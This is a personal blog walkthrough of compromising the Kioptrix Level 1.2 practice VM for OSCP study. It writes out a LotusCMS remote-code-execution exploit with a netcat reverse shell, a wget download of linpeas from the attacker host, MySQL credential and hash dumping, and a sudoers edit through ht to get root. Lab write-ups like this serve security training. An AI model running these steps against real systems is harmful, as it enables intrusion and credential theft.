<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Kioptrix Level 1.2 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next, I ran threader3000 and let it run its recommended nmap scan."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content=" Kioptrix - Level 1.2"><meta name=twitter:description content="Kioptrix Level 1.2 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next, I ran threader3000 and let it run its recommended nmap scan."><meta property="og:title" content=" Kioptrix - Level 1.2"><meta property="og:description" content="Kioptrix Level 1.2 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next, I ran threader3000 and let it run its recommended nmap scan."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-08-09-kioptrix-level-1.2/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-08-09T00:00:00+00:00"><meta property="article:modified_time" content="2020-08-09T00:00:00+00:00"><title>Kioptrix - Level 1.2 · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-08-09-kioptrix-level-1.2/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.94.2"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-08-09-kioptrix-level-1.2/>Kioptrix - Level 1.2</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-08-09T00:00:00Z>August 9, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
5-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/oscp/>OSCP</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/lotuscms/>LotusCMS</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/mysql/>mysql</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/privilege-escalation/>privilege escalation</a></span></div></div></header><div><p><a href=https://www.vulnhub.com/entry/kioptrix-level-12-3,24/>Kioptrix</a> Level 1.2 is a vulnerable machine found on the <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">NetSecFocus Trophy Room</a> list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.</p><p>First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used <strong>netdiscover -i eth0</strong> until I came across the IP of this machine.</p><p><img src=/assets/img/KioptrixLevel31.png alt="Kioptrix Level 1.3 netdiscover"></p><p>Next, I ran <strong>threader3000</strong> and let it run its recommended nmap scan.</p><p><img src=/assets/img/KioptrixLevel32.png alt="Kioptrix Level 1.2 threader3000 nmap"></p><p>It appears that only SSH and HTTP are open. Let&rsquo;s take a look at the website. It appears that there is a <strong>Login</strong> link on the main page.</p><p><img src=/assets/img/KioptrixLevel33.png alt="Kioptrix 1.2 Website"></p><p>Let&rsquo;s take a look at the login page. This gives us our first hint. This is running <strong>LotusCMS</strong>.</p><p><img src=/assets/img/KioptrixLevel34.png alt="Kioptrix Level 1.2 LotusCMS login"></p><p>I next ran a search on Google and came across the following <a href=https://github.com/Hood3dRob1n/LotusCMS-Exploit>exploit</a>. This exploit appears to open a reverse shell as the user that is running the CMS. From my attacker PC, I ran <strong>git clone <a href=https://github.com/Hood3dRob1n/LotusCMS-Exploit.git>https://github.com/Hood3dRob1n/LotusCMS-Exploit.git</a></strong>. This will make a copy of the exploit in a directory named <strong>LotusCMS-Exploit</strong>. Run <strong>cd LotusCMS-Exploit</strong> followed by <strong>ls</strong> to list the directory contents.</p><p><img src=/assets/img/KioptrixLevel35.png alt="Kioptrix Level 1.2 git clone LotusCMS Exploit"></p><p>Open up a second terminal windows, and run <strong>nc -nvlp [port number]</strong> where the port number is one of your choosing. This will open a listener to catch the reverse shell.</p><p><img src=/assets/img/KioptrixLevel36.png alt="Kioptrix Level 1.2 nc reverse shell"></p><p>Next, go back to your Lotus CMS exploit terminal window and run <strong>./lotusRCE.sh</strong>. This will explain how to use this exploit.</p><p><img src=/assets/img/KioptrixLevel37.png alt="Kioptrix Level 1.2 LotusRCE.sh usage"></p><p>Now that we know what we should be entering, let&rsquo;s run <strong>./lotusRCE.sh [machine ip] /</strong> . You should be notified that the site is vulnerable to injection and be asked for an IP to use which is <strong>your attacker ip</strong> and a port <strong>the one you specified in your netcat listener</strong>. Next, choose option <strong>1</strong> for the way to connect to your netcat listener.</p><p><img src=/assets/img/KioptrixLevel38.png alt="Kioptrix Level 1.2 LotusCMS Exploit options"></p><p>Once entered, press enter and go to your other terminal window on your attacker pc. You should now have an initial foothold on this box. Let&rsquo;s run <strong>python -c &lsquo;import pty; pty.spawn("/bin/sh")&rsquo;</strong> to create a better shell.</p><p><img src=/assets/img/KioptrixLevel39.png alt="Kioptrix Level 1.2 initial foothold"></p><p>Running <strong>whoami</strong> reveals that you are running as <strong>www-data</strong>. Running <strong>cat /etc/passwd</strong> reveals 2 other nonroot users, <strong>loneferret</strong> and <strong>dreg</strong>.</p><p><img src=/assets/img/KioptrixLevel310.png alt="Kioptrix Level 1.2 whoami cat /etc/passwd"></p><p>I attempted to run <strong>sudo -l</strong> but was prompted for a password. Let&rsquo;s navigate to the tmp directory with <strong>cd /tmp</strong>. This is typically a world writeable directory that we are going to save linpeas to in order to do further enumeration. On your attacker pc, start an HTTP server with <strong>python3 -m http.server</strong> in a directory you have linpeas saved in.</p><p><img src=/assets/img/KioptrixLevel311.png alt="Kioptrix Level 1.1 python3 http server"></p><p>On the victim terminal window with the initial foothold, let&rsquo;s run <strong>wget http://[attacker ip]:8000/linpeas.sh</strong> followed by <strong>chmod +x linpeas.sh</strong> to make it executable.</p><p><img src=/assets/img/KioptrixLevel312.png alt="Kioptrix Level 1.2 wget chmod"></p><p>Now, run this script with <strong>./linpeas.sh</strong>. This produces a massive amount of output as it appears that it has an old version of metasploit installed on it along with a lot of mysql activity. However, near the very end, we will uncover a password for mysql.</p><p><img src=/assets/img/KioptrixLevel313.png alt="Kioptrix Level 1.2 mysql password"></p><p>Let&rsquo;s try to connect to mysql as root with this wonderfully mature password. To do so, run <strong>mysql -u root -p</strong> and enter <strong>fuckeyou</strong> when prompted for the password.</p><p><img src=/assets/img/KioptrixLevel314.png alt="Kioptrix Level 1.2 mysql root access"></p><p>Success! Let&rsquo;s run <strong>show databases;</strong> to list the databases and select gallery with <strong>use gallery;</strong> Next, let&rsquo;s run <strong>show tables;</strong> and you will notice a table named <strong>dev_accounts</strong>. Let&rsquo;s run <strong>select * from dev_accounts;</strong> and you will see two sets of credentials with hashed passwords for dreg and loneferret.</p><p><img src=/assets/img/KioptrixLevel315.png alt="Kioptrix Level 1.1 Password Hashes"></p><p>I went to <a href=https://crackstation.net>Crackstation</a> and entered these two hashes, which cracked these md5 hashes.</p><p><img src=/assets/img/KioptrixLevel316.png alt="Kioptrix Level 1.1 crack md5 hash Crackstation"></p><p>We now have passwords of <strong>Mast3r</strong> for the user <strong>dreg</strong> and <strong>starwars</strong> for the user <strong>loneferret</strong>. Let&rsquo;s run <strong>su loneferret</strong> and enter the password cracked above and see what happens.</p><p><img src=/assets/img/KioptrixLevel317.png alt="Kioptrix Level 1.2 su loneferret"></p><p>Success! It appears that his password was reused. Let&rsquo;s open another terminal windows and run <strong>ssh loneferret@[machine ip]</strong> and enter his password of <strong>starwars</strong> to connect.</p><p><img src=/assets/img/KioptrixLevel318.png alt="Kioptrix Level 1.2 ssh"></p><p>We now have a more proper shell. Let&rsquo;s run <strong>ls -al</strong> to list the contents of loneferret&rsquo;s home directory.</p><p><img src=/assets/img/KioptrixLevel319.png alt="Kioptrix Level 1.2 ls home directory"></p><p>There&rsquo;s a README file in this folder. Let&rsquo;s run <strong>cat CompanyPolicy.README</strong> to take a look at it.</p><p><img src=/assets/img/KioptrixLevel320.png alt="Kioptrix Level 1.2 cat README"></p><p>Let&rsquo;s run <strong>sudo -l</strong> and see if loneferret can run ht with escalated privileges.</p><p><img src=/assets/img/KioptrixLevel321.png alt></p><p>It appears that it can be ran without a password as root! It also appears that <strong>su</strong> could be ran if that line of the file in <strong>/etc/sudoers</strong> could somehow be modified&mldr; Let&rsquo;s run <strong>sudo ht</strong> to open up this program.</p><p><img src=/assets/img/KioptrixLevel322.png alt="Kioptrix Level 1.2 sudo ht error"></p><p>Of course it couldn&rsquo;t be that simple. A quick Google search revealed that this error is due to an improper TERM variable value. Let&rsquo;s run <strong>export TERM=xterm</strong> to temporarily set it to xterm instead of xterm-256color.</p><p><img src=/assets/img/KioptrixLevel323.png alt="Kioptrix Level 1.2 TERM environment variable"></p><p>Now, let&rsquo;s try running <strong>sudo ht</strong> again. This will open <strong>ht</strong> which is an editor program of some sort. At the bottom you will notice numbers with commands by them. These are accessed by using the appropriate function key on your keyboard. Let&rsquo;s press <strong>F3</strong> to run the <strong>open</strong> command.</p><p><img src=/assets/img/KioptrixLevel324.png alt="Kioptrix Level 1.2 ht editor"></p><p>In the box that pops up, enter in <strong>/etc/sudoers</strong> and press enter.</p><p><img src=/assets/img/KioptrixLevel325.png alt="Kioptrix Level 1.2 ht editor /etc/sudoers"></p><p>Success! We were able to open this file for editing due to us running this command as sudo. Let&rsquo;s remove the ! from in front of <strong>/usr/bin/su</strong> and press <strong>F2</strong> to save.</p><p><img src=/assets/img/KioptrixLevel326.png alt="Kioptrix Level 1.2 ht modify /etc/sudoers"></p><p>Next, press <strong>F10</strong> to exit ht, and run <strong>sudo su</strong>. Unfortunately, this does not work.</p><p><img src=/assets/img/KioptrixLevel327.png alt="Kioptrix Level 1.2 sudo su failure"></p><p>This is because <strong>su</strong> is in the <strong>/bin</strong> folder and not the <strong>/usr/bin</strong> folder. I then reran <strong>sudo ht</strong> and pulled up the <strong>/etc/sudoers</strong> file again and modified <strong>/usr/bin/su</strong> to <strong>/bin/su</strong>.</p><p><img src=/assets/img/KioptrixLevel328.png alt="Kioptrix Level 1.2 ht round 2"></p><p>Now once saved (with <strong>F2</strong>), press <strong>F10</strong> to exit back to terminal and run <strong>sudo su</strong> again.</p><p><img src=/assets/img/KioptrixLevel329.png alt="Kioptrix Level 1.2 root shell"></p><p>Next I ran <strong>cd /root</strong> followed by <strong>ls -al</strong> to list the contents. there is a <strong>Congrats.txt</strong> file here. Let&rsquo;s read it with <strong>cat Congrats.txt</strong>.</p><p><img src=/assets/img/KioptrixLevel330.png alt="Kioptrix Level 1.2 root flag Congrats.txt"></p><p>With that, this box is complete!</p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2022
Kiel Vaughn</section></footer></main><script src=/js/coder.min.f453d26c79f010446cf0d9770197f77de32c07b7a5512d141a286247fe154a22.js integrity="sha256-9FPSbHnwEERs8Nl3AZf3feMsB7elUS0UGihiR/4VSiI="></script></body></html>